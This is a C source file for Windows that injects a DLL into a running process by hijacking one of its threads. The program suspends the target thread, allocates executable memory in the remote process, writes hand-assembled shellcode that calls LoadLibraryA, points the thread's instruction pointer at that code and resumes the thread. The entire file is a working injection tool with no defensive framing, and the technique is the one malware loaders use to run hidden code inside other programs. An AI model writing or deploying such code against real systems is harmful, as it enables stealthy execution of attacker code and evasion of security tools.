# include <stdio.h>
# include <Windows.h>
# include <tlhelp32.h>
# include <winnt.h>
# include <psapi.h>

// Defines:

# define REQUIRED_ARGS_COUNT (4)
# define SHELLCODE_SIZE (17)
# define RETURN_SUCCESS (0)
# define ERROR_FAILED_GETTING_SNAPSHOT (1)
# define ERROR_FAILED_GETTING_THREAD (2)
# define ERROR_FAILED_GETTING_NEXT_THREAD (3)
# define ERROR_FAILED_GETTING_THREAD_HANDLE (4)
# define ERROR_FAILED_SUSPENDING_THREAD (5)
# define ERROR_FAILED_GETTING_THREAD_CONTEXT (6)
# define ERROR_FAILED_GETTING_PROCESS_HANDLE (7)
# define ERROR_FAILED_ALLOCATE_REMOTE_MEMORY (8)
# define ERROR_FAILED_WRITE_REMOTE_PROCESS (9)
# define ERROR_FAILED_TO_WRITE_PROPER_AMOUNT (10)
# define ERROR_FAILED_SETTING_THREAD_CONTEXT (11)
# define ERROR_FAILED_RESUMING_THREAD (12)
# define ERROR_FAILED_FREE_REMOTE_PROCESS (13)
# define ERROR_FAILED_GETTING_KERNEL32_HANDLE (14)
# define ERROR_FAILED_GETTING_LOADLIBRARY_ADDRESS (15)
# define ERROR_FAILED_SENDING_MESSAGE_TO_WINDOW (16)
# define ERROR_WRONG_USAGE (17)

int main(int argc, char* argv[])
{
	size_t len = 0;
	DWORD dwEIP = 0;
	BOOL bResult = 0;
	INT_PTR diff = 0;
	DWORD dwResult = 0;
	int iPIDToInject = 0;
	int iTIDToInject = 0;
	char* pDllPath = NULL;
	char* pBuffer2 = NULL;
	HANDLE hThread = NULL;
	HANDLE hKernel = NULL;
	HANDLE hProcess = NULL;
	size_t iWrittenbytes = 0;
	char pBuffer[256] = { 0 };
	char* relLoadLibrary = NULL;
	FARPROC pLoadLibrary = NULL;
	CONTEXT ThreadContext = { 0 };
	LPVOID pRemoteAllocatedMemory = NULL;
	HANDLE hProcessToInjectSnapshot = NULL;

	// parse given arguments

	if (REQUIRED_ARGS_COUNT != argc)
	{
		printf("Error: wrong usage. Program should get 3 arguments: PID, TID, and the DLL-path to inject.\nTry again");
		return ERROR_WRONG_USAGE;
	}
	iPIDToInject = atoi(argv[1]);
	iTIDToInject = atoi(argv[2]);
	pDllPath = argv[3];

	// suspend the thread

	hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, iTIDToInject);
	if (NULL == hThread)
	{
		printf("Error: failed to get handle to thread. see error code: %d\n", GetLastError());
		CloseHandle(hProcessToInjectSnapshot);
		return ERROR_FAILED_GETTING_THREAD_HANDLE;
	}

	dwResult = SuspendThread(hThread);
	if (-1 == dwResult)
	{
		printf("Error: failed to suspend thread. see error code: %d\n", GetLastError());
		CloseHandle(hProcessToInjectSnapshot);
		CloseHandle(hThread);
		return ERROR_FAILED_SUSPENDING_THREAD;
	}

	bResult = 0;
	ThreadContext.ContextFlags = CONTEXT_ALL;
	bResult = GetThreadContext(hThread, &ThreadContext);
	if (0 == bResult)
	{
		printf("Error: failed to get thread context. see error code: %d\n", GetLastError());
		CloseHandle(hProcessToInjectSnapshot);
		CloseHandle(hThread);
		return ERROR_FAILED_GETTING_THREAD_CONTEXT;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, iPIDToInject);
	if (NULL == hProcess)
	{
		printf("\nError: failed to get handle to process. check error code: %d\n", GetLastError());
		CloseHandle(hProcessToInjectSnapshot);
		CloseHandle(hThread);
		return ERROR_FAILED_GETTING_PROCESS_HANDLE;
	}

	dwEIP = ThreadContext.Eip;

	hKernel = GetModuleHandleW(L"kernel32.dll");
	if (NULL == hKernel)
	{
		printf("\nError: failed to get handle to kernel32.dll. check error code: %d\n", GetLastError());
		CloseHandle(hProcessToInjectSnapshot);
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return ERROR_FAILED_GETTING_KERNEL32_HANDLE;
	}

	pLoadLibrary = GetProcAddress(hKernel, "LoadLibraryA");
	if (NULL == pLoadLibrary)
	{
		printf("\nError: failed to get loadlibrary address. check error code: %d\n", GetLastError());
		CloseHandle(hProcessToInjectSnapshot);
		CloseHandle(hThread);
		CloseHandle(hKernel);
		CloseHandle(hProcess);
		return ERROR_FAILED_GETTING_LOADLIBRARY_ADDRESS;
	}

	// copy the shellcode from buffer to remote process memory

	len = strlen(pDllPath);
	pRemoteAllocatedMemory = VirtualAllocEx(hProcess, NULL, len + SHELLCODE_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (NULL == pRemoteAllocatedMemory)
	{
		printf("\nError: failed to allocate remote memory. check error code: %d\n", GetLastError());
		CloseHandle(hProcessToInjectSnapshot);
		CloseHandle(hThread);
		CloseHandle(hKernel);
		CloseHandle(hProcess);
		return ERROR_FAILED_ALLOCATE_REMOTE_MEMORY;
	}

	// build buffer for containing the shellcode

	memcpy(pBuffer, pDllPath, len);
	pBuffer[len + 1] = 0x68;					// push (imm value)
	pBuffer2 = pBuffer + len + 2;
	memcpy(pBuffer2, &pRemoteAllocatedMemory, 4);
	pBuffer[len + 6] = 0xE8;					// relative call
	pBuffer2 = pBuffer + len + 7;
	relLoadLibrary = (char *)pLoadLibrary - ((char *)pRemoteAllocatedMemory + len + 11);
	memcpy(pBuffer2, &relLoadLibrary, 4);		// LoadLibrary
	pBuffer[len + 11] = 0x68;					// push
	pBuffer2 = pBuffer + len + 12;
	memcpy(pBuffer2, &dwEIP, 4);				// EIP value for pushing
	pBuffer[len + 16] = 0xc3;					// ret

	// copy buffer to relevant allocated remote space

	bResult = 0;
	bResult = WriteProcessMemory(hProcess, pRemoteAllocatedMemory, pBuffer, len + SHELLCODE_SIZE, &iWrittenbytes);
	if (0 == bResult)
	{
		printf("\nError: failed to write to remote process memory. check error code: %d\n", GetLastError());
		CloseHandle(hProcessToInjectSnapshot);
		CloseHandle(hThread);
		CloseHandle(hKernel);
		CloseHandle(hProcess);
		return ERROR_FAILED_WRITE_REMOTE_PROCESS;
	}
	if (len + SHELLCODE_SIZE != iWrittenbytes)
	{
		printf("\nError: failed to write proper amount of bytes. \n Bytes to write: %d, Bytes actually written: %d\n", (int)(len + SHELLCODE_SIZE), iWrittenbytes);
		CloseHandle(hProcessToInjectSnapshot);
		CloseHandle(hThread);
		CloseHandle(hKernel);
		CloseHandle(hProcess);
		return ERROR_FAILED_TO_WRITE_PROPER_AMOUNT;
	}

	// make the thread to execute the shellcode

	ThreadContext.Eip = (char *)pRemoteAllocatedMemory + len + 1;
	bResult = 0;
	bResult = SetThreadContext(hThread, &ThreadContext);
	if (0 == bResult)
	{
		printf("\nError: failed to set thread context. check error code: %d\n", GetLastError());
		CloseHandle(hProcessToInjectSnapshot);
		CloseHandle(hThread);
		CloseHandle(hKernel);
		CloseHandle(hProcess);
		return ERROR_FAILED_SETTING_THREAD_CONTEXT;
	}

	dwResult = 0;
	dwResult = ResumeThread(hThread);
	if (-1 == dwResult)
	{
		printf("Error: failed to resume thread. see error code: %d\n", GetLastError());
		CloseHandle(hProcessToInjectSnapshot);
		CloseHandle(hThread);
		CloseHandle(hKernel);
		CloseHandle(hProcess);
		return ERROR_FAILED_RESUMING_THREAD;
	}

	bResult = 0;
	bResult = PostThreadMessageW(iTIDToInject, WM_SHOWWINDOW, TRUE, SW_OTHERUNZOOM);
	if (0 == bResult)
	{
		printf("Error: failed to send message to the process's window. see error code: %d\n", GetLastError());
		CloseHandle(hProcessToInjectSnapshot);
		CloseHandle(hThread);
		CloseHandle(hKernel);
		CloseHandle(hProcess);
		return ERROR_FAILED_SENDING_MESSAGE_TO_WINDOW;
	}

	// Close handles and exit

	CloseHandle(hProcessToInjectSnapshot);
	CloseHandle(hThread);
	CloseHandle(hKernel);
	CloseHandle(hProcess);

	return RETURN_SUCCESS;
}